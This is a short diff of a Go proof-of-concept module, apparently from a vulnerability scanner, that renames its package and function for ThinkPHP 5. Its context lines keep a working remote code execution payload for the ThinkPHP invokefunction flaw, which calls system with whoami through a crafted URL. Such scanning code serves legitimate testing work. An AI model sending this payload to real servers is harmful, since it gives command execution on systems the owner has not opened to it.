@@ -1,4 +1,4 @@
-package main
+package ThinkPHP_V5
 
 import (
 	"fmt"
@@ -13,7 +13,7 @@ func PocInfo() string {
 	return PocName
 }
 
-func Poc(pocUrl string) string {
+func PocThinkPhp5(pocUrl string) string {
 	// 对pocUrl进行处理 TODO 暂时不处理
 	payload := pocUrl + "/index.php?s=index/\\think\\App/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami"
 	err := c.Visit(payload)
